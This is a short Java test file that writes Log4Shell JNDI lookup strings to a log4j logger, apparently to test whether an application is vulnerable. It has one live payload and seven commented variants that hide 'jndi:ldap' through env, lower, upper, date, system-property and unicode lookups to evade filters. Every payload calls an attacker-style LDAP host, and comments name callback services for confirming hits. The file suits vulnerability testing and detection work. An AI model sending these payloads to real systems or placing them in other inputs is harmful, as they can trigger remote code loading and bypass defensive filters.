import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {

        // To test entry you can use website:
        // http://dnslog.cn/
        // or
        // http://canarytokens.org/generate (Choose Log4Shell token)

        // Defaul one
        logger.error("${jndi:ldap://somesitehackerofhell.com/z}");

        // 1. System environment variables
        // logger.error("${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}");

        // 2. Lower Lookup
        // logger.error("${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}");

        // 2. Upper Lookup
        // upper doesn't work for me - Tested on Windows 10
        // logger.error("${${upper:j}ndi:${upper:l}${upper:d}a${upper:p}://somesitehackerofhell.com/z}");

        // 3. "::-" notation
        // logger.error("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}");

        // 4. Invalid Unicode characters with upper
        // logger.error("${jnd${upper:ı}:ldap://somesitehackerofhell.com/z}");

        // 5. System properties
        // logger.error("${jnd${sys:SYS_NAME:-i}:ldap://somesitehackerofhell.com/z}");

        // 6. ":-" notation
        // logger.error("${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}");

        // 7. Date
        // logger.error("${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://somesitehackerofhell.com/z}");
    }
}